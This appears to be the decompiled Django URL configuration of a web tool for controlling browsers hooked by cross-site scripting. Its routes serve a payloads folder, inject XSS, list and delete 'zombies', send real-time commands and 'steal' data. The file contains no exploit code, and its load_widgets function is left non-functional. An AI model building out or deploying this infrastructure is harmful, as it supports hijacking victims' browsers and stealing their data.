# Embedded file name: C:\lab\w2g\ui\..\ui\urls.py
from django.conf.urls.defaults import *
from django.views.generic.simple import direct_to_template, redirect_to
import os
from settings import SYSTEM_PATH
SITEROOT = os.path.dirname(__file__)
urlpatterns = patterns('', ('^statics/(?P<path>.*)$', 'django.views.static.serve', {'document_root': os.path.join(SITEROOT, 'statics')}), ('^payloads/(?P<path>.*)$', 'django.views.static.serve', {'document_root': os.path.join(SITEROOT, 'payloads')}), ('^' + SYSTEM_PATH + 'login/$', 'django.contrib.auth.views.login'), ('^logout/$', 'django.contrib.auth.views.logout', {'next_page': '/' + SYSTEM_PATH + 'login/'}))
urlpatterns += patterns('ui.main.views', ('^' + SYSTEM_PATH + '$', 'index'))
# urlpatterns += patterns('ui.cc.views', ('$', 'index'))
urlpatterns += patterns('ui.ende.views', ('^ende/?$', 'ende_basic'), ('^' + SYSTEM_PATH + '$', 'ende_basic'))
urlpatterns += patterns('ui.codz.views', ('^codz/?$', 'index'), ('^codz/add/?$', 'addcodz'), ('^codz/del/?$', 'delcodz'), ('^codz/detail/?$', 'detail', {'template': 'codz/detail.html'}), ('^codz/edit/?$', 'editcodz'))
urlpatterns += patterns('ui.cc.views', ('^cc/?$', 'index'), ('^cc/injxss/?$', 'injxss'), ('^cc/delzombie/?$', 'delzombie'), ('^cc/report/(\\d+)/?$', 'report', {'template': 'cc/report.html'}), ('^rtcmd/?$', 'rtcmd'), ('^steal/?$', 'steal'), ('^cc/lastest_zombies/?$', 'lastest_zombies'), ('^cc/desczombie/?$', 'desczombie'))
urlpatterns += patterns('ui.http.views', ('^http/?$', 'index'), ('^http/view/request/?$', 'request'))

def load_widgets(widgets_path):
    ls = os.listdir(widgets_path)
    for l in ls:
        abs_l = os.path.join(widgets_path, l)
        if os.path.isfile(abs_l):
            uri = '^widgets/%s$' % l.split('.')[0]
            page = abs_l


urlpatterns += patterns('', ('^widgets/js_object_spy$', direct_to_template, {'template': 'widgets/js_object_spy.htm'}))
urlpatterns += patterns('ui.setting.views', ('^setting/?$', 'index'), ('^changepwd/?$', 'changepwd', {'template': 'setting/index.html'}))
urlpatterns += patterns('ui.about.views', ('^about/?$', 'index'))
urlpatterns += patterns('ui.cc.views', ('^testpage/?$', 'testpage'),('^imghandle/?$', 'imghandle'))